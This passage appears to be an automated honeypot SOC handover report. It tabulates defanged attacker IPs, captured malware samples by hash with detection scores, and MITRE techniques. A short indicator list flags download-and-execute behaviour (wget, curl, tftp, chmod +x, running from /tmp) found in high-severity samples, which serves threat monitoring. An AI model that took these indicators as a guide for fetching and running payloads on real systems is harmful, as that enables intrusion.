| `139.199.80[.]137` | **4** | 2026-08-16 15:15 | 2026-08-16 16:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.10.169[.]205` | **2** | 2026-08-16 15:43 | 2026-08-16 15:45 | 2m | 0 | `T1592` | 🟢 LOW |
| `116.15.199[.]114` | **2** | 2026-08-16 15:52 | 2026-08-16 15:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-16 15:14 | 2026-08-16 15:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-08-16 16:29 | 2026-08-16 16:33 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.152.52[.]236` | 1 | 2026-08-16 15:19 | 2026-08-16 15:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `153.37.177[.]219` | 1 | 2026-08-16 15:14 | 2026-08-16 15:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-16 15:14 | 2026-08-16 15:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.46.9[.]208` | 1 | 2026-08-16 16:43 | 2026-08-16 16:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.76.139[.]54` | 1 | 2026-08-16 16:12 | 2026-08-16 16:12 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-16 16:04 | 2026-08-16 16:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-16 15:35 | 2026-08-16 15:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.72.74[.]162` | 1 | 2026-08-16 16:17 | 2026-08-16 16:17 | 6s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/72** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `122.165.72[.]15` | IN | ABTS Tamilnadu, | **100** ⚠️ | 50 |
| `49.124.153[.]9` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 49 |
| `217.165.22[.]192` | AE | Emirates Telecommunications Corporation | **100** ⚠️ | 1 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `65.20.153[.]146` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `121.202.206[.]119` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 50 |
| `1.247.245[.]61` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `176.10.203[.]54` | SE | Bahnhof AB | **100** ⚠️ | 50 |
| `183.233.85[.]194` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 82 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 72 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 14 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 14 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 12 |

---

## 🔕 False Positive Summary (28 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 4325 cases |
| Tool 34  | Credential Extractor        | ✅ 90 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 74 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 28 filtered (0.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 58 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 72 priority case(s) shown individually · 16 recon entry/entries in table (8 group(s) consolidating 4217 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-16T18:35:31Z_
